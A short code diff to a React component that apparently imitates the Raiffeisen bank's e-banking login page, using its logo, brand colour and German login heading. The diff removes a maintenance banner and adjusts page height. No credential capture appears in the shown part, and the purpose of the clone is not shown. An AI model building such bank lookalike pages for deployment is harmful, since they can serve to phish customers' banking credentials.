@@ -61,14 +61,9 @@ const ChRaiffeisen = () => {
           <RaiffeisenLogo className="h-7 text-[#E2001A]" />
         </header>
 
-        {/* Maintenance banner */}
-        <div className="bg-[#1a1a1a] text-white py-3 px-6 md:px-12 text-sm flex items-center gap-4">
-          <span className="font-bold">Wartungsarbeiten im E-Banking am 19. / 20. Juni 2026</span>
-          <a href="#" className="underline hover:no-underline">Mehr anzeigen</a>
-        </div>
-
         {/* Full-screen main area */}
-        <main className="flex-1 flex flex-col px-6 md:px-12">
+        <main className="flex-1 flex flex-col px-6 md:px-12 min-h-[calc(100vh-80px)]">
+
           <div className="w-full max-w-[530px] md:ml-[22%] pt-12 md:pt-16">
             <h1 className="text-3xl md:text-4xl font-bold mb-10">Login für E-Banking</h1>
 
